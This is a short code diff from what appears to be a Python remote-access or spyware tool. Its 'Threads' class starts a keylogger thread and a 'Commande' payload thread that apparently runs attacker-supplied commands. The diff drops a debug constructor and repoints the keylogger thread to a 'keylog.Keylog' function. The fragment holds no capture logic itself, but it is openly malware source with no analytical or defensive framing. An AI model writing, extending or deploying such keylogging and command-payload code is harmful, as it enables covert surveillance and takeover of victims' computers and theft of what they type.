@@ -34,12 +34,9 @@ class Threads:
     thread_id = 0
     thread_name = "null"
 
-    def __init__(self):
-        print("Initialisation ")
-
     def StartThread(self, fonction, arg1 = ""):
         if "Keylogger" in fonction:
-            thread = threading.Thread(target=Keylogger().Keylogger, name=fonction)
+            thread = threading.Thread(target=keylog.Keylog, name=fonction)
             thread.start()
         if "Commande" in fonction:
             thread = threading.Thread(target=payload.Commande, name=fonction, args=arg1)
